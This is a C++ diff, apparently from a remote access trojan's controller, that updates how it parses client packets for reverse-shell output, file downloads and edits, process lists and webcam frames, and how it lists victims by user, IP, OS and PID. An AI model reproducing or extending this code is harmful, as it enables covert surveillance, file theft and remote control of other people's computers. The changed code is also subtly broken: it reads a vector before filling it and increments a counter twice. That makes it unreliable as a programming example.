@@ -63,10 +63,10 @@ void Cliente_Handler::Spawn_Handler(){
             continue;
         }
 
-        vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 5);
-
+        
         //Pquete inicial
         if (vcDatos[0] == "01") {
+            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 5);
             if (vcDatos.size() < 4) {
                 this->Log("Error procesando los datos " + std::string(cBuffer));
                 continue;;
@@ -82,7 +82,7 @@ void Cliente_Handler::Spawn_Handler(){
 
             std::unique_lock<std::mutex> lock(p_Servidor->count_mutex);
             
-            p_Servidor->m_InsertarCliente(structTmp);
+            p_Servidor->m_InsertarCliente(structTmp, p_Servidor->iCount++);
             p_Servidor->iCount++;
             
             lock.unlock();
@@ -91,7 +91,6 @@ void Cliente_Handler::Spawn_Handler(){
 
         //Termino la shell
         if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Finish)) { 
-            //this->EscribirSalidShell(vcDatos[1]);
             continue;
         }
 
@@ -104,6 +103,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Dir_Folder)) {
+            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
             std::vector<std::string> vcFileEntry;
             wxString strTama = "-";
             if (vcDatos[1][1] == '>') {
@@ -162,6 +162,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Init)) {
+            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 3);
             //Tamaño del archivo recibido
             u64 uTamArchivo = StrToUint(vcDatos[2].c_str());
 
@@ -176,6 +177,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_End)) {
+            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
             auto archivo = this->um_Archivos_Descarga2.find(vcDatos[1]);
             if (archivo != this->um_Archivos_Descarga2.end()) {
                 if (archivo->second.iFP != nullptr) {
@@ -188,6 +190,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Editar_Archivo_Paquete)) {
+            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
             //Tamaño del id del comando, id del archivo y dos back slashes
             int iHeadSize = 2 + vcDatos[0].size() + vcDatos[1].size();
             char* cBytes = cBuffer + iHeadSize;
@@ -220,6 +223,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::PM_Lista)) {
+            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
             panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowById(EnumIDS::ID_PM_Panel, this->n_Frame);
             if (panel_proc) {
                 panel_proc->listManager->AgregarData(vcDatos[1], this->p_Cliente._strPID);
@@ -239,6 +243,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::CM_Lista_Salida)) {
+            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
             std::vector<std::string> vcCams = strSplit(vcDatos[1], '|', 50);
             wxComboBox* panel_cam_combo = (wxComboBox*)wxWindow::FindWindowById(EnumCamMenu::ID_Combo_Devices, this->n_Frame);
             if (panel_cam_combo) {
@@ -253,11 +258,13 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::CM_Single_Salida)){
-            int iHeadSize = (std::to_string(EnumComandos::CM_Single_Salida).size() + 1); //CMD + len del delimitador
+            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
+            //CMD DEL ID_DEV DEL BUFFER
+            this->Log(cBuffer);
+            int iHeadSize = (std::to_string(EnumComandos::CM_Single_Salida).size() + 2) + vcDatos[1].size(); //CMD + len de dos delimitador + len del id del dev
             int iBuffSize = iRecibido - iHeadSize;
             char* cBytes = cBuffer + iHeadSize;
-            panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowById(EnumCamMenu::ID_Picture_Frame, this->n_Frame);
-            //panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName(this->p_Cliente._id);
+            panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[1], this->n_Frame);
             if (panel_picture) {
                 if (panel_picture->iBufferSize > 0) {
                     delete[] panel_picture->cPictureBuffer;
@@ -735,13 +742,16 @@ void Servidor::m_ReproducirPaquete(char* pBuffer, size_t iLen) {
     waveOutClose(wo);
 }
 
-void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
-    m_listCtrl->InsertItem(this->iCount, wxString(p_Cliente._id));
-    m_listCtrl->SetItem(this->iCount, 1, wxString(p_Cliente._strUser));
-    m_listCtrl->SetItem(this->iCount, 2, wxString(p_Cliente._strIp));
-    m_listCtrl->SetItem(this->iCount, 3, wxString(p_Cliente._strSo));
-    m_listCtrl->SetItem(this->iCount, 4, wxString(p_Cliente._strPID));
-    m_listCtrl->SetItem(this->iCount, 5, wxString(p_Cliente._strCpu));
+void Servidor::m_InsertarCliente(struct Cliente& p_Cliente, int iIndex){
+    if (iIndex == -1) {
+        iIndex = 0;
+    }
+    m_listCtrl->InsertItem(iIndex, wxString(p_Cliente._id));
+    m_listCtrl->SetItem(iIndex, 1, wxString(p_Cliente._strUser));
+    m_listCtrl->SetItem(iIndex, 2, wxString(p_Cliente._strIp));
+    m_listCtrl->SetItem(iIndex, 3, wxString(p_Cliente._strSo));
+    m_listCtrl->SetItem(iIndex, 4, wxString(p_Cliente._strPID));
+    m_listCtrl->SetItem(iIndex, 5, wxString(p_Cliente._strCpu));
 }
 
 void Servidor::m_RemoverClienteLista(std::string p_ID){
